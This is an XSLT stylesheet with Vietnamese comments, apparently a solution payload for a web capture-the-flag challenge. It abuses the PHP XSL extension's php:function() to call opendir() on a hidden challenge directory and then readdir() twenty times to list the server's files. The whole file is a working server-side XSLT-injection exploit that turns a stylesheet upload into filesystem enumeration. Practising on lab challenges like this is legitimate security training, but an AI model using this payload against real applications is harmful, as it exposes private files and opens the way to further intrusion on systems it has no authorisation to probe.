<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:php="http://php.net/xsl">

    <!-- cho dễ đọc, in plain text -->
    <xsl:output method="text" omit-xml-declaration="yes"/>

    <xsl:template match="/">

        <!-- 1) Mở thư mục challenge (có thể dùng '.' hoặc path tuyệt đối) -->
        <xsl:value-of select="php:function('opendir','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826ffcdee/')"/>
        <xsl:text>&#x0A;</xsl:text>

        <!-- 2) Gọi readdir() nhiều lần, KHÔNG truyền tham số -->
        <xsl:value-of select="php:function('readdir')"/><xsl:text>&#x0A;</xsl:text>
        <xsl:value-of select="php:function('readdir')"/><xsl:text>&#x0A;</xsl:text>
        <xsl:value-of select="php:function('readdir')"/><xsl:text>&#x0A;</xsl:text>
        <xsl:value-of select="php:function('readdir')"/><xsl:text>&#x0A;</xsl:text>
        <xsl:value-of select="php:function('readdir')"/><xsl:text>&#x0A;</xsl:text>
        <xsl:value-of select="php:function('readdir')"/><xsl:text>&#x0A;</xsl:text>
        <xsl:value-of select="php:function('readdir')"/><xsl:text>&#x0A;</xsl:text>
        <xsl:value-of select="php:function('readdir')"/><xsl:text>&#x0A;</xsl:text>
        <xsl:value-of select="php:function('readdir')"/><xsl:text>&#x0A;</xsl:text>
        <xsl:value-of select="php:function('readdir')"/><xsl:text>&#x0A;</xsl:text>
        <xsl:value-of select="php:function('readdir')"/><xsl:text>&#x0A;</xsl:text>
        <xsl:value-of select="php:function('readdir')"/><xsl:text>&#x0A;</xsl:text>
        <xsl:value-of select="php:function('readdir')"/><xsl:text>&#x0A;</xsl:text>
        <xsl:value-of select="php:function('readdir')"/><xsl:text>&#x0A;</xsl:text>
        <xsl:value-of select="php:function('readdir')"/><xsl:text>&#x0A;</xsl:text>
        <xsl:value-of select="php:function('readdir')"/><xsl:text>&#x0A;</xsl:text>
        <xsl:value-of select="php:function('readdir')"/><xsl:text>&#x0A;</xsl:text>
        <xsl:value-of select="php:function('readdir')"/><xsl:text>&#x0A;</xsl:text>
        <xsl:value-of select="php:function('readdir')"/><xsl:text>&#x0A;</xsl:text>
        <xsl:value-of select="php:function('readdir')"/><xsl:text>&#x0A;</xsl:text>

    </xsl:template>
</xsl:stylesheet>
